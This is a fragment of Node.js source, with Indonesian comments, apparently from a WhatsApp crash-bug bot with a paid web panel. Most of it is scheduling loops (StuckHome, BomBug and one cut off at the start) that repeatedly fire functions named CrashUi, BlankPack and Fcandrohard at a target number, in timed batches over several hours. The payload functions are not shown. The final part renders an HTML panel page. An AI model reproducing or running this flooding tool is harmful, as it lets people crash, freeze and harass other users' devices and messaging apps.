        ForcloseClickFomo(sock, X),
            await sleep(5600)
        ]);
        console.log(chalk.red(`
Succesfull Send Bug Yang Ke${count + 1}
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function StuckHome(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 20) {
        await Promise.all([
        BlankClickBreee(X),
        BlankClickBreee(X),
        BlankClickBreee(X),
        BlankClickBreee(X),
        await sleep(4000),
        BlankPack(X),
        BlankPack(X),
        BlankPack(X),
        CrashUi(sock, X),
        CrashUi(sock, X),
        CrashUi(sock, X),
        Fcandrohard(sock, X),
        await sleep(3000),
        BlankClickBreee(X),
        BlankClickBreee(X),
        BlankClickBreee(X),
        BlankClickBreee(X),
        await sleep(4000),
        BlankPack(X),
        BlankPack(X),
        BlankPack(X),
        CrashUi(sock, X),
        CrashUi(sock, X),
        CrashUi(sock, X),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1 blankios 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 3000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function BomBug(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 25) {
        await Promise.all([
        
       await sleep(5000)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 INVISIBLE 🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade VOLTAGE DEATH ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ==================== HTML EXECUTION ==================== //
// ==================== HTML EXECUTION ==================== //
// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  userKey = "", // ✅ Parameter untuk key/password
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  const filePath = path.join(__dirname, "MainFile", "Pusat.html");

  try {
    let html = fs.readFileSync(filePath, "utf8");

    // Ganti semua placeholder di HTML - URUTAN PENTING!
    html = html
      // 1. Ganti userKey/password terlebih dahulu
      .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g, userKey || "Unknown")
      .replace(/\$\{userKey\}/g, userKey || "")
      .replace(/\$\{password\}/g, userKey || "")
      .replace(/\{\{password\}\}/g, userKey || "")
      .replace(/\{\{key\}\}/g, userKey || "")
      .replace(/\$\{key\}/g, userKey || "")
      // 2. Ganti username
      .replace(/\$\{username\s*\|\|\s*'Unknown'\}/g, username || "Unknown")
      .replace(/\$\{username\}/g, username || "Unknown")
      .replace(/\{\{username\}\}/g, username || "Unknown")
      // 3. Ganti yang lainnya
      .replace(/\{\{expired\}\}/g, formattedTime)
      .replace(/\{\{status\}\}/g, status)
      .replace(/\{\{message\}\}/g, message)
      .replace(/\$\{formattedTime\}/g, formattedTime);

    return html;
  } catch (err) {
    console.error("Gagal membaca file Pusat.html:", err);
    return `<h1>Gagal memuat halaman</h1>`;
  }
};